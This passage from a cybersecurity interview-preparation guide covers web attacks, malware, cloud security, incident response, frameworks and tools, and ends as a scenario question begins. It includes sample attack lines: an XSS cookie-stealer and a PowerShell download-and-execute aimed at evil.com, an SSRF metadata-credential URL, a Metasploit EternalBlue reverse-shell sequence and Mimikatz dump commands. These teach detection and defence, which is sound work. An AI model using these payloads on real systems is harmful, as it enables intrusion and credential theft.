Injecting malicious JavaScript into a web page that executes in other users' browsers.

- **Stored XSS** — Payload saved in DB, executes for every visitor
- **Reflected XSS** — Payload in URL, executes when victim clicks link
- **DOM-based XSS** — Client-side DOM manipulation, server never sees the payload

> **Example (Stored):** Attacker posts: `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` in a comment. Every visitor sends their session cookie to the attacker.
>
> **Prevention:** Output encoding, Content Security Policy (CSP), HTTPOnly cookie flag.

---

**Q68. What is privilege escalation?**

Gaining higher privileges than originally granted.

- **Vertical:** Standard user → Admin/Root
- **Horizontal:** User A accessing User B's resources at the same privilege level

**Common techniques:**
- Linux: SUID exploitation, sudo misconfiguration, kernel exploits, writable `/etc/passwd`
- Windows: UAC bypass, DLL hijacking, unquoted service paths, token impersonation

---

**Q69. What is lateral movement?**

After initial compromise, moving to other systems within the network to expand access.

**Techniques:** Pass-the-Hash, Pass-the-Ticket, PsExec, WMI, WinRM, RDP, SMB shares, Cobalt Strike's `jump` command.

> **Detection:** Unusual Logon Type 3 (network auth) from workstations to servers, service installations (4697) on systems an account doesn't normally touch, NTLM authentication where Kerberos is expected.

---

**Q70. What are LOLBins (Living off the Land Binaries)?**

Legitimate Windows system tools abused by attackers because they're signed by Microsoft, trusted, and already present — bypassing application whitelisting and reducing AV detections.

| Binary | Abuse |
|--------|-------|
| `certutil.exe` | Download files, decode base64 |
| `mshta.exe` | Execute remote HTML applications (HTA) |
| `regsvr32.exe` | Execute remote DLLs (Squiblydoo) |
| `rundll32.exe` | Execute DLL exports |
| `wscript/cscript.exe` | Execute VBScript/JScript |
| `powershell.exe` | Nearly everything |
| `bitsadmin.exe` | Download files |
| `wmic.exe` | Lateral movement, process execution |

> **Detection:** These binaries making network connections, spawning unusual child processes, or running with base64-encoded command lines are all red flags. Event ID 4688 with command-line logging captures these.

---

**Q71. What is a CSRF attack and how is it prevented?**

Cross-Site Request Forgery — tricking an authenticated user's browser into sending an unintended request to a site they're logged into.

> **Example:** User logged into bank.com visits evil.com, which has:
> `<img src="https://bank.com/transfer?to=attacker&amount=5000">`
> Browser sends request with session cookie → bank processes transfer.
>
> **Prevention:** CSRF tokens (unique, per-session value in forms), SameSite cookie attribute, re-authentication for sensitive actions.

---

**Q72. What is SSRF (Server-Side Request Forgery)?**

Attacker makes the server issue requests to unintended targets — often internal services inaccessible from outside.

> **Classic example:** `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name` — AWS metadata endpoint. Server fetches it and returns cloud IAM credentials to the attacker.
>
> **Prevention:** Allowlist permitted URLs/IPs, disable unnecessary URL-fetching features.

---

**Q73. What is a buffer overflow?**

Writing more data into a buffer than it was allocated for, overflowing into adjacent memory — potentially overwriting the return address to redirect execution.

> **Example:** Program allocates 100 bytes for input. Attacker sends 200 bytes. The extra 100 bytes overflow the stack, overwriting the return address with the address of attacker's shellcode.
>
> **Modern mitigations:** ASLR (randomise memory layout), DEP/NX (non-executable stack), Stack Canaries, SafeSEH.

---

**Q74. What is the difference between Threat Hunting and Threat Intelligence?**

- **Threat Intelligence:** External data collection — who is attacking, what TTPs they use, what IoCs are known. Reactive input. *"What might come at us?"*
- **Threat Hunting:** Proactive internal investigation using intelligence as a guide. Analysts form hypotheses and hunt through logs/telemetry. *"Is it already inside?"*

> **Example workflow:** Intel says APT29 uses PowerShell for execution (T1059.001) → Hunter creates hypothesis: "Do we have unusual PowerShell spawning processes?" → Hunts SIEM/EDR logs → Finds anomaly → Begins investigation.

---

**Q75. What is social engineering? Name the main types.**

Psychological manipulation to gain access, information, or trust.

| Type | Description |
|------|-------------|
| Phishing | Mass email fraud |
| Spear Phishing | Targeted, personalised phishing |
| Whaling | Spear phishing at C-level executives |
| Vishing | Voice call deception |
| Smishing | SMS-based phishing |
| Pretexting | Fabricated scenario to build trust |
| Baiting | Leaving infected USB drives for victims to plug in |
| Tailgating | Following someone through a secured door |

---

## 8. DEFENSE, DETECTION & MONITORING

---

**Q76. [CRITICAL] What is a SIEM and how does it work?**

SIEM (Security Information and Event Management) centralises log collection, correlates events across sources, and generates alerts.

**Core functions:**
- **Log aggregation** — Collect from firewalls, DCs, endpoints, cloud, applications
- **Normalisation** — Convert different log formats to a common structure
- **Correlation** — Apply rules: "5 failed logins + 1 success from same IP in 5 minutes = alert"
- **Alerting** — Generate tickets/notifications for analyst triage
- **Forensic search** — Search historical logs during investigations

> **Common SIEMs:** Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM, LogRhythm.

---

**Q77. [CRITICAL] What is the CIA Triad?**

The three core pillars of information security:

- **Confidentiality** — Only authorised parties access data (encryption, access control)
- **Integrity** — Data is not altered without authorisation (hashing, digital signatures)
- **Availability** — Systems and data are accessible when needed (redundancy, backups, DDoS protection)

> **Attack against each:** Ransomware attacks all three — encrypts data (confidentiality), alters/locks files (integrity), makes systems unusable (availability).

---

**Q78. What is Defence in Depth?**

A layered security strategy where multiple independent controls protect the same asset. If one fails, others remain.

```
[Physical security]
  [Perimeter firewall]
    [Network segmentation]
      [Endpoint protection]
        [Application security]
          [Data encryption]
            [IAM / least privilege]
              [Monitoring & response]
```

> **Analogy:** A castle — moat, outer wall, inner wall, keep, guards. Breaching one layer doesn't grant full access.

---

**Q79. What is Zero Trust?**

A security model based on "never trust, always verify." No user or device is trusted by default — regardless of network location.

**Principles:**
1. Verify every access request (MFA, device health, context)
2. Use least privilege
3. Assume breach — monitor everything, segment everything

> **Old model:** "Inside the network = trusted." Zero Trust: "Inside or outside = equally untrusted until verified."

---

**Q80. What is DLP (Data Loss Prevention)?**

A system that monitors and prevents unauthorised movement of sensitive data outside the organisation.

- **Endpoint DLP** — Monitors USB, clipboard, print, email from devices
- **Network DLP** — Inspects outbound traffic for PII, card numbers, IP
- **Cloud DLP** — Monitors uploads to cloud storage

> **Example:** Employee tries to email a spreadsheet with 500 credit card numbers. Network DLP detects the pattern, blocks the email, and alerts the security team.

---

**Q81. What is DKIM, SPF, and DMARC?**

Email authentication standards working together to prevent spoofing:

| Protocol | What it does |
|----------|-------------|
| **SPF** | DNS record listing authorised sending servers |
| **DKIM** | Cryptographic signature on emails, verified by receiver |
| **DMARC** | Policy: what to do if SPF/DKIM fail (none/quarantine/reject) + reporting |

> **Without all three:** Attacker can send email appearing to be from `ceo@company.com`.
> **With all three:** The spoofed email fails SPF check, DMARC policy rejects it, and you receive a DMARC report about the attempt.

---

**Q82. What is the difference between false positive and false negative?**

- **False Positive** — Alert fires on benign activity. Wastes analyst time. Causes alert fatigue. Risk: analysts start ignoring alerts.
- **False Negative** — Real attack goes undetected. **More dangerous.** Attacker operates undetected.

> **Tuning goal:** Minimise both — but in practice, most teams tune to reduce false positives at acceptable false negative risk. The balance depends on what you're protecting.

---

**Q83. What is threat modelling and what is STRIDE?**

Threat modelling systematically identifies security threats during design. STRIDE categorises threats:

| Letter | Threat | Target Property |
|--------|--------|----------------|
| **S** | Spoofing | Authentication |
| **T** | Tampering | Integrity |
| **R** | Repudiation | Non-repudiation |
| **I** | Information Disclosure | Confidentiality |
| **D** | Denial of Service | Availability |
| **E** | Elevation of Privilege | Authorisation |

> **Example:** Designing a new API — run STRIDE on each component. "Could an attacker spoof the client identity?" → Add mutual TLS. Document threats found and mitigations applied.

---

**Q84. What is vulnerability management?**

The ongoing cycle of identifying, classifying, prioritising, and remediating security vulnerabilities.

**Process:** Scan → Assess severity (CVSS score) → Prioritise by risk (severity × exploitability × asset value) → Remediate (patch, mitigate, accept) → Verify → Repeat.

> **CVSS (Common Vulnerability Scoring System):** 0-10 scale. Critical ≥ 9.0. Widely used to standardise severity communication.

---

**Q85. What is the difference between a vulnerability assessment and a penetration test?**

| | Vulnerability Assessment | Penetration Test |
|--|------------------------|-----------------|
| Method | Automated scanning | Manual + tool-assisted |
| Exploits? | No | Yes |
| Depth | Breadth-focused | Goal-focused |
| Output | List of vulnerabilities | Demonstrated impact |
| Frequency | Continuous/regular | Periodic |

---

## 9. WEB APPLICATION SECURITY

---

**Q86. [CRITICAL] What is the OWASP Top 10?**

Most critical web application security risks (2021 edition):

1. **Broken Access Control** — Users doing things they shouldn't be allowed to do
2. **Cryptographic Failures** — Sensitive data exposed due to weak/missing encryption
3. **Injection** — SQLi, command injection, LDAP injection
4. **Insecure Design** — Security not considered during design phase
5. **Security Misconfiguration** — Default passwords, verbose errors, open S3 buckets
6. **Vulnerable and Outdated Components** — Using libraries with known CVEs
7. **Identification and Authentication Failures** — Weak passwords, no MFA, session issues
8. **Software and Data Integrity Failures** — Supply chain attacks, insecure deserialization
9. **Security Logging and Monitoring Failures** — Not detecting breaches in time
10. **Server-Side Request Forgery (SSRF)**

---

**Q87. What is path traversal?**

Manipulating file path parameters with `../` to access files outside the intended directory.

> **Example:** `https://site.com/download?file=../../../../etc/passwd`
> If the app doesn't sanitise, it reads the system password file.
> **Prevention:** Validate and sanitise file paths. Use allowlists of permitted files. Never concatenate user input into file paths.

---

**Q88. What is clickjacking and how is it prevented?**

Overlaying an invisible iframe over a legitimate-looking page to trick users into clicking something they can't see.

> **Example:** Invisible Facebook "Like" button overlaid on a "Claim your prize" button.
> **Prevention:** `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` HTTP response headers.

---

**Q89. What are HTTP security headers and why do they matter?**

| Header | Purpose |
|--------|---------|
| `Strict-Transport-Security` (HSTS) | Force HTTPS, prevent downgrade attacks |
| `Content-Security-Policy` (CSP) | Restrict sources of scripts/styles — prevents XSS |
| `X-Frame-Options` | Prevent clickjacking |
| `X-Content-Type-Options: nosniff` | Prevent MIME type sniffing |
| `Referrer-Policy` | Control referrer information leakage |
| `Permissions-Policy` | Restrict browser features (camera, mic, geolocation) |

---

**Q90. What is the difference between authentication and session management vulnerabilities?**

- **Authentication flaws:** Weak passwords, no account lockout, no MFA, default credentials, predictable tokens.
- **Session management flaws:** Session tokens in URL, long session lifetime, no invalidation on logout, predictable session IDs.

> **Example attack:** User logs out, but session token remains valid. Attacker who captured the token can still authenticate as that user (session fixation/not invalidating).

---

## 10. MALWARE & MODERN THREATS

---

**Q91. [CRITICAL] What is the difference between a virus, worm, and Trojan?**

| Type | Self-replicates? | Needs host? | Needs user action? |
|------|----------------|-------------|-------------------|
| **Virus** | Yes | Yes (attaches to files) | Yes (run the file) |
| **Worm** | Yes | No | No (self-propagates via network) |
| **Trojan** | No | No | Yes (user installs thinking it's legitimate) |

> **Example:** WannaCry = worm (self-propagated via EternalBlue). A cracked game with a hidden RAT = Trojan.

---

**Q92. What is fileless malware and why is it hard to detect?**

Malware that runs entirely in memory without writing files to disk. It abuses legitimate system tools (PowerShell, WMI, certutil) to execute payloads. Traditional file-based antivirus cannot detect it since there's no file to scan.

> **Example:** PowerShell downloads shellcode directly into memory: `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
>
> **Detection:** Memory analysis, behavioural EDR (detects suspicious API calls), script block logging (PowerShell Event ID 4104), AMSI (Antimalware Scan Interface).

---

**Q93. What is ransomware and how does a ransomware attack typically unfold?**

Ransomware encrypts victim's files and demands payment for the decryption key.

**Typical attack chain:**
1. Initial access — phishing email / exposed RDP / VPN vulnerability
2. Persistence established — registry run keys, scheduled tasks
3. Lateral movement — spread to as many systems as possible
4. Privilege escalation — obtain Domain Admin
5. Data exfiltration — steal data first (double extortion)
6. Mass encryption — deploy ransomware across domain
7. Ransom note dropped

> **Defence:** Offline/offsite backups (3-2-1 rule), EDR, network segmentation, least privilege, MFA on remote access.

---

**Q94. What is a rootkit and how is it detected?**

Malware that hides itself (and other malicious components) from the OS, security tools, and analysts by operating at or below the OS level.

**Types:** Userland, Kernel-level (most dangerous — modifies kernel), Bootkit (loads before OS), Hypervisor-level.

**Detection:** Memory forensics, integrity checking (compare known-good hashes), offline scanning (boot from clean media), behaviour-based detection.

---

**Q95. What is a RAT (Remote Access Trojan)?**

Malware providing full remote control to the attacker: command execution, file access, keylogging, screen capture, webcam/mic access.

> **Common RATs:** njRAT, AsyncRAT, QuasarRAT, DarkComet. Typically communicate over common ports (80, 443) to evade detection.

---

**Q96. What is a botnet and what is it used for?**

A network of infected machines (bots) controlled via C2 infrastructure. Used for: DDoS attacks, spam/phishing campaigns, credential stuffing, cryptocurrency mining, proxy networks.

> **Example:** Mirai botnet — infected IoT devices (cameras, routers using default passwords) — launched 1.2 Tbps DDoS attack on Dyn DNS in 2016, taking down Twitter, Netflix, Reddit.

---

**Q97. What are persistence mechanisms and why do attackers use them?**

Persistence ensures the attacker maintains access even after system restarts or credential changes.

**Common Windows persistence mechanisms:**
- Registry Run keys (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`)
- Scheduled tasks (Event ID 4698)
- Services (Event ID 4697 / 7045)
- Startup folder
- WMI event subscriptions (stealthy — rarely checked)
- DLL hijacking

> **Detection:** Event IDs 4697, 4698, 7045. Autoruns (Sysinternals) shows all persistence points on a system.

---

**Q98. What is PowerShell-based malware and how do you detect it?**

PowerShell is a powerful scripting language built into Windows — attackers abuse it for fileless attacks, downloading payloads, lateral movement, and bypassing controls.

**Detection:**
- **Event ID 4104** (Script Block Logging) — logs the full PowerShell script content, including deobfuscated code
- **Event ID 4103** (Module Logging) — logs pipeline execution
- Suspicious indicators: base64-encoded commands (`-EncodedCommand`), `IEX` (Invoke-Expression), `DownloadString`, `Bypass` execution policy

> **Enable via GPO:** Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell → Turn on Script Block Logging.

---

## 11. CLOUD SECURITY

---

**Q99. [CRITICAL] What is the Shared Responsibility Model?**

Security in cloud is shared between the provider and customer:

| | AWS/Azure/GCP manages | Customer manages |
|---|---|---|
| IaaS | Physical, network, hypervisor | OS, apps, data, IAM |
| PaaS | Above + OS, runtime | Apps, data |
| SaaS | Everything | Data, user access |

> **Most breaches happen in the customer's responsibility zone** — misconfigured S3 buckets, overly permissive IAM, unpatched OS on EC2.

---

**Q100. What is the difference between IaaS, PaaS, and SaaS?**

- **IaaS (Infrastructure as a Service):** Virtual machines, storage, networking. You manage OS upward. (AWS EC2, Azure VMs)
- **PaaS (Platform as a Service):** Platform and OS managed for you. You write and deploy the application. (Heroku, Google App Engine)
- **SaaS (Software as a Service):** Fully managed application. You just use it. (Gmail, Office 365, Salesforce)

---

**Q101. What are common cloud misconfigurations and their impact?**

| Misconfiguration | Impact |
|----------------|--------|
| Public S3 bucket | Data exposure — billions of records leaked historically |
| Overly permissive IAM roles | Privilege escalation, account takeover |
| Unrestricted security groups (0.0.0.0/0) | Exposed databases, RDP, SSH to internet |
| No MFA on root/admin accounts | Full account compromise |
| Exposed metadata endpoint | IAM credential theft (SSRF → metadata → credentials) |
| Disabled CloudTrail | No forensic trail after breach |

> **Real case:** Capital One 2019 — SSRF vulnerability + overly permissive EC2 IAM role → access to 100M customer records in S3.

---

**Q102. What is AWS IAM and what are key security principles?**

IAM (Identity and Access Management) controls who (identity) can do what (permission) to which AWS resources.

**Security principles:**
- Least privilege — grant minimum required permissions
- Never use root account for day-to-day operations
- Use roles (not access keys where possible) for EC2 instances
- Rotate access keys regularly
- Enable MFA on all human accounts

---

**Q103. What is the difference between AWS Security Groups and NACLs?**

| | Security Groups | NACLs |
|--|----------------|-------|
| Level | Instance (EC2) | Subnet |
| State | Stateful (return traffic automatic) | Stateless (explicit allow both directions) |
| Rules | Allow only | Allow and Deny |
| Evaluation | All rules evaluated | Rules evaluated in order (by number) |

> **Example:** Security Group allows inbound 443. Return traffic is automatically allowed (stateful). NACL would need explicit outbound allow rule for the return traffic.

---

**Q104. What are key AWS security monitoring services?**

| Service | Purpose |
|---------|---------|
| **CloudTrail** | Logs all API calls — who did what, when |
| **GuardDuty** | Threat detection — ML-based anomaly detection |
| **Security Hub** | Centralised security findings aggregation |
| **Config** | Tracks configuration changes, compliance |
| **Inspector** | Vulnerability scanning for EC2 and containers |
| **Macie** | Discovers and protects sensitive data in S3 |

> **If CloudTrail is disabled in an AWS account — that's a critical alert.** Attackers disable it to eliminate forensic evidence.

---

**Q105. What is container security and what are the key risks?**

Containers (Docker/Kubernetes) introduce specific security concerns:

| Risk | Description |
|------|-------------|
| Privileged containers | Container with `--privileged` can escape to host |
| Exposed Kubernetes API server | Unauthenticated API = full cluster compromise |
| Outdated base images | Known CVEs in container images |
| Secrets in environment variables | Credentials visible in `docker inspect` |
| Container escape | Vulnerabilities allowing breakout to host OS |

> **Best practice:** Run containers as non-root, use read-only filesystems, scan images (Trivy), apply network policies in Kubernetes.

---

## 12. INCIDENT RESPONSE & FORENSICS

---

**Q106. [CRITICAL] What are the 6 phases of NIST Incident Response?**

| Phase | What happens |
|-------|-------------|
| **1. Preparation** | Build playbooks, train team, deploy tools, establish contacts |
| **2. Identification** | Detect the incident — SIEM alert, user report, threat hunting |
| **3. Containment** | Short-term (isolate system) + long-term (patch vector) |
| **4. Eradication** | Remove malware, close access, fix vulnerability |
| **5. Recovery** | Restore systems, verify integrity, return to operation |
| **6. Lessons Learned** | Post-incident review — what failed, what worked, improve |

---

**Q107. [CRITICAL] What is the order of volatility in digital forensics?**

Collect most volatile evidence first, as it's lost when systems are powered off:

1. **CPU registers, cache** — Most volatile
2. **RAM / Memory** (running processes, network connections, encryption keys)
3. **Swap/Page file**
4. **Network state** (ARP table, routing table, active connections)
5. **Running processes**
6. **Disk** (files, logs, registry)
7. **Remote logs / SIEM**
8. **Backups / Archives** — Least volatile

> **Key point:** Never pull the power cord first — you'll lose everything in RAM, including potentially the encryption keys for an active ransomware incident.

---

**Q108. What is the difference between volatile and non-volatile evidence?**

- **Volatile:** Lost when system powers off — RAM contents, active network connections, running processes, ARP cache, clipboard data. **Collect first.**
- **Non-volatile:** Persists after shutdown — hard drive, registry, log files, email, browser history.

---

**Q109. What is chain of custody?**

A documented, unbroken record tracking who handled evidence, when, and what was done — from collection through legal proceedings. Required for evidence to be admissible in court.

> **Process:** Image drive (with write-blocker) → compute SHA-256 hash → seal in evidence bag with label (date, time, analyst, case number) → log every access. Any break in custody may invalidate the evidence.

---

**Q110. What is a forensic image?**

A bit-for-bit copy of a storage device capturing every sector — including deleted files, unallocated space, and slack space. Created with a write-blocker to ensure the original is not modified.

> **Tools:** `dd`, FTK Imager, Autopsy. Hash (MD5/SHA-256) computed before and after to prove integrity.

---

**Q111. What would you do if another company reports that attack traffic is coming from your IP?**

1. Don't panic or admit anything prematurely — verify first
2. Check logs for traffic originating from that IP at the reported time
3. If confirmed — immediately **isolate** the source system
4. Conduct malware scan and memory forensics — assume compromise
5. Identify how the system was compromised (initial access vector)
6. Begin full Incident Response process
7. Preserve evidence before any remediation
8. Communicate back to the reporting company professionally; cooperate
9. Notify management and legal team (potential legal/compliance implications)

---

**Q112. What is triage in incident response?**

Quickly assessing and prioritising incidents based on severity, scope, and impact to allocate response resources effectively.

> **Severity levels:**
> - **P1/Critical** — Active attack, data exfiltration in progress, ransomware spreading
> - **P2/High** — Confirmed compromise, contained but ongoing
> - **P3/Medium** — Suspicious activity, possible compromise
> - **P4/Low** — Policy violation, vulnerability discovered, no active exploitation

---

## 13. SECURITY FRAMEWORKS & GOVERNANCE

---

**Q113. [CRITICAL] What is the NIST Cybersecurity Framework (CSF)?**

A voluntary framework providing a common language and structure for managing cybersecurity risk. Five core functions:

| Function | Description |
|----------|-------------|
| **Identify** | Understand your assets, risks, and context |
| **Protect** | Implement safeguards (access control, training, encryption) |
| **Detect** | Continuously monitor for anomalies and events |
| **Respond** | Contain, analyse, and mitigate incidents |
| **Recover** | Restore operations, improve based on lessons learned |

---

**Q114. What is ISO 27001?**

An international standard for Information Security Management Systems (ISMS). Provides a framework for systematically managing and protecting information through risk assessment and treatment.

> **Certification:** Organisations can achieve ISO 27001 certification through a third-party audit. Key requirement: risk assessment, treatment plan, set of controls (Annex A), and continuous improvement.

---

**Q115. [CRITICAL] What is the difference between a vulnerability, threat, and risk?**

- **Vulnerability** — A weakness (unpatched software, misconfigured service, human behaviour)
- **Threat** — An agent or event that could exploit a vulnerability (attacker, natural disaster, insider)
- **Risk** — The probability and impact of a threat exploiting a vulnerability

> **Formula:** Risk = Likelihood × Impact
> **Example:** Unpatched Apache (vulnerability) + publicly known exploit (threat) = Critical risk. Unpatched internal tool with no network exposure = Low risk.

---

**Q116. What are the four responses to risk?**

- **Avoidance** — Eliminate the risk by stopping the activity
- **Mitigation** — Reduce likelihood or impact (patch, add controls)
- **Transfer** — Move risk to a third party (insurance, outsourcing)
- **Acceptance** — Acknowledge the risk as acceptable (documented decision)

> **Example:** Can't patch a critical legacy system. Mitigation = network isolate it. Transfer = insure against breach. Acceptance = document the decision and its justification.

---

**Q117. [CRITICAL] What is the principle of least privilege?**

Users, systems, and processes should have only the minimum access required to perform their function.

> **Why it matters:** If a compromised account has least privilege, the blast radius is limited. A marketing intern shouldn't have access to the financial database. A web server process shouldn't have write access to system directories.

---

**Q118. What is separation of duties?**

No single person should have sufficient access to both initiate and approve a sensitive action — requiring collusion to commit fraud or cause harm.

> **Example:** The person who creates a vendor payment request should not also be the one who approves it. A developer should not also have production deployment rights without a change approval process.

---

**Q119. What is RTO and RPO?**

- **RTO (Recovery Time Objective)** — Maximum acceptable time to restore a system after disruption
- **RPO (Recovery Point Objective)** — Maximum acceptable data loss measured in time (how old can the backup be?)

> **Example:** RPO = 4 hours means backups every 4 hours — you can lose up to 4 hours of data. RTO = 2 hours means you must be back online within 2 hours of failure.

---

**Q120. What is GDPR and what are its key requirements?**

The EU's General Data Protection Regulation governs personal data handling for EU citizens.

Key requirements:
- Lawful basis for processing personal data
- Data minimisation — collect only what you need
- Right to access, right to erasure (right to be forgotten)
- Breach notification within **72 hours** to the supervisory authority
- Privacy by design

> **Penalty:** Up to €20M or **4% of global annual turnover** — whichever is higher.

---

**Q121. What is PCI-DSS?**

Payment Card Industry Data Security Standard. Requirements for organisations that handle cardholder data:
- Maintain a secure network (firewalls)
- Protect cardholder data (encrypt transmission)
- Vulnerability management (patch, antivirus)
- Access control (least privilege, MFA)
- Monitor and test networks regularly
- Maintain an information security policy

---

**Q122. What is the difference between a policy, standard, procedure, and guideline?**

| Document | Mandatory? | Specificity | Example |
|----------|-----------|-------------|---------|
| **Policy** | Yes | High-level | "All sensitive data must be encrypted" |
| **Standard** | Yes | Specific requirements | "Use AES-256 for data at rest" |
| **Procedure** | Yes | Step-by-step | "How to encrypt a database field" |
| **Guideline** | No | Recommended | "Consider using hardware security modules" |

---

## 14. IDENTITY, ACCESS & AUTHENTICATION

---

**Q123. [CRITICAL] What are the three authentication factors and what is MFA?**

- **Something you know** — Password, PIN, security question
- **Something you have** — Hardware token, smart card, authenticator app (OTP)
- **Something you are** — Biometrics: fingerprint, retina, face recognition

**MFA** requires two or more **different** factors. Two passwords is NOT MFA. Password + OTP = MFA.

> **Common MFA bypass:** SIM swapping (hijacking phone number for SMS OTP), MFA fatigue attacks (spamming push notifications until user accepts), AiTM phishing (adversary-in-the-middle proxies that capture session cookies post-MFA).

---

**Q124. What is AAA in security?**

- **Authentication** — Prove identity (who are you?)
- **Authorisation** — Determine permissions (what can you do?)
- **Accounting** — Record activity (what did you do, when?)

> **Protocols:** RADIUS (network access authentication), TACACS+ (device administration — separates AAA cleanly, full packet encryption).

---

**Q125. What is Zero Trust and how is it implemented practically?**

Zero Trust: assume no user, device, or network location is inherently trusted. Every access request is verified.

**Implementation:**
- MFA for all access
- Device health verification (MDM/endpoint compliance)
- Micro-segmentation (limit lateral movement)
- Just-in-time (JIT) access — no standing privileges
- Continuous monitoring and re-verification
- Least privilege across all systems

---

**Q126. What is SAML and how does SSO work?**

SAML (Security Assertion Markup Language) enables Single Sign-On (SSO) between an Identity Provider (IdP) and a Service Provider (SP).

**Flow:**
1. User attempts to access Salesforce (SP)
2. Salesforce redirects to Okta (IdP)
3. User authenticates with Okta (one time)
4. Okta sends a **signed SAML assertion** to Salesforce
5. Salesforce trusts the assertion — user is logged in

> **Benefit:** One authentication → access to many applications. One place to enforce MFA, access policies, and revoke access.

---

**Q127. What is the difference between RADIUS and TACACS+?**

| Feature | RADIUS | TACACS+ |
|---------|--------|---------|
| Transport | UDP | TCP |
| Encryption | Password field only | Entire payload |
| AAA | Combined in one request | Fully separated |
| Primary use | Wi-Fi/VPN authentication | Network device (router/switch) admin |
| Vendor | Open standard | Cisco-proprietary (but open now) |

---

**Q128. What is LDAP and what ports does it use?**

LDAP (Lightweight Directory Access Protocol) queries and modifies directory services like Active Directory.

- **Port 389** — Plaintext (avoid — credentials sent in clear)
- **Port 636** — LDAPS (TLS encrypted)

> **Security risk:** LDAP injection is similar to SQL injection — user input embedded in LDAP queries can manipulate directory lookups. Always sanitise input.

---

**Q129. What is PAM (Privileged Access Management)?**

A solution controlling, monitoring, and auditing access to privileged accounts (Domain Admin, root, service accounts).

**Features:** Password vaulting (auto-rotation), session recording, just-in-time access, approval workflows, credential checkout.

> **Example:** Instead of admins knowing the root password, they request it from CyberArk, which checks out a time-limited credential, records the session, and auto-rotates the password after use.

---

## 15. PRACTICAL TOOLS & APPLIED KNOWLEDGE

> **Why this matters:** Interviewers increasingly ask HOW you use tools, not just WHAT they are.

---

**Q130. [CRITICAL] How would you use Wireshark to investigate suspicious traffic?**

**Common filters:**
- `tcp.port == 445` — Show only SMB traffic
- `dns` — Show all DNS queries
- `http.request.method == "POST"` — POST requests (look for credential submissions)
- `ip.addr == 192.168.1.50` — Traffic to/from specific host
- `tcp.flags.syn == 1 && tcp.flags.ack == 0` — SYN packets only (port scan detection)

**Scenario — DNS exfiltration:** Filter `dns`. Look for unusually long query names, queries to a single external domain, or base64-looking subdomains.

**Scenario — Lateral movement:** Filter `tcp.port == 445`. Unexpected SMB connections between workstations (not to file servers) is suspicious.

---

**Q131. How would you use nmap and what are the key flags?**

| Command | Purpose |
|---------|---------|
| `nmap -sn 192.168.1.0/24` | Ping sweep — find live hosts |
| `nmap -sS target` | SYN scan (stealthy — doesn't complete handshake) |
| `nmap -sV target` | Service/version detection |
| `nmap -O target` | OS detection |
| `nmap -A target` | Aggressive — OS, version, scripts, traceroute |
| `nmap -p- target` | Scan all 65535 ports |
| `nmap --script vuln target` | Run vulnerability detection scripts |

> **Legal reminder:** Only scan systems you own or have written permission to test.

---

**Q132. What is Splunk and how would you write a basic query?**

Splunk is a SIEM/log analytics platform using its own query language: **SPL (Search Processing Language)**.

**Basic queries:**
```
# Find all failed logins
index=windows EventCode=4625

# Count failed logins by user
index=windows EventCode=4625 | stats count by Account_Name | sort -count

# Find logins from non-standard hours (outside 8am-6pm)
index=windows EventCode=4624 | eval hour=strftime(_time, "%H") | where hour < 8 OR hour > 18

# Detect potential lateral movement
index=windows EventCode=4624 Logon_Type=3 | stats dc(Computer) as machines by Account_Name | where machines > 5
```

---

**Q133. What is Metasploit and what are its core components?**

A penetration testing framework providing exploits, payloads, and post-exploitation modules.

| Component | Description |
|-----------|-------------|
| `msfconsole` | Main interface |
| **Exploit** | Code that triggers a vulnerability |
| **Payload** | Code that runs after exploitation (Meterpreter, shell) |
| **Auxiliary** | Scanners, fuzzers, recon tools |
| **Post** | Post-exploitation modules (hashdump, persistence) |
| **Handler** | Listens for reverse connections |

> **Basic flow:** `use exploit/windows/smb/ms17_010_eternalblue` → `set RHOSTS target` → `set PAYLOAD windows/x64/meterpreter/reverse_tcp` → `set LHOST attacker-ip` → `run`

---

**Q134. What is Burp Suite used for?**

Web application security testing. Core functions: proxy (intercept and modify HTTP/HTTPS traffic), scanner (find vulnerabilities), repeater (manually replay and modify requests), intruder (automated attacks — brute force, fuzzing).

> **Common use:** Intercept a login POST request, modify parameters, test for SQLi or authentication bypass. Send to Repeater to test variations.

---

**Q135. What is Mimikatz and what can it do?**

A credential extraction tool that reads Windows authentication data from memory.

| Command | Action |
|---------|--------|
| `sekurlsa::logonpasswords` | Dump credentials from LSASS |
| `sekurlsa::tickets` | Dump Kerberos tickets |
| `lsadump::sam` | Dump SAM database hashes |
| `lsadump::dcsync` | Perform DCSync attack |
| `kerberos::golden` | Create a Golden Ticket |
| `kerberos::ptt` | Pass-the-Ticket |

> **Detection:** EDR alerts on LSASS access, Windows Defender, Credential Guard prevents many Mimikatz techniques.

---

**Q136. What is Responder and what does it do?**

A tool that poisons LLMNR/NetBIOS/mDNS queries on a local network, responding to name resolution requests with the attacker's IP — then capturing Net-NTLMv2 hashes when victims authenticate.

> **Workflow:** Run Responder → wait for LLMNR/NetBIOS queries (happen constantly in Windows environments) → hashes captured → crack offline with Hashcat or relay with ntlmrelayx.

---

**Q137. What is the difference between rockyou.txt and SecLists?**

- **rockyou.txt** — A wordlist of ~14 million real passwords from the 2009 RockYou breach. Default in Kali Linux at `/usr/share/wordlists/rockyou.txt` (compressed as `.gz`, decompress with `gunzip`). Best starting point for password attacks.
- **SecLists** — A large collection of wordlists for many purposes: passwords, usernames, directory names, DNS subdomains, fuzzing payloads. Located in `/usr/share/seclists/`.

---

**Q138. What is a basic process for privilege escalation enumeration on Linux?**

```bash
whoami && id                  # Current user and groups
sudo -l                       # What can I run as sudo?
find / -perm -4000 2>/dev/null  # Find SUID binaries
cat /etc/crontab              # Check scheduled tasks
ps aux                        # Running processes (any root processes?)
env                           # Environment variables (any credentials?)
ls -la /home                  # Other user home directories
cat /etc/passwd               # User accounts
uname -a                      # Kernel version (kernel exploits?)
```

> **GTFOBins** (gtfobins.github.io) — database of Unix binaries that can be exploited for privilege escalation, file read, file write, etc. if misconfigured.

---

## 16. SCENARIO-BASED QUESTIONS

> **Critical note:** These questions test your *thinking process*, not just your memory. Interviewers want to see methodical, logical reasoning. Always think out loud.

---

**SCENARIO Q1. [CRITICAL] Your SIEM alerts at 2am: 10,000 failed logins to a single account in 5 minutes, then one successful login. What do you do?**

**Thought process:**
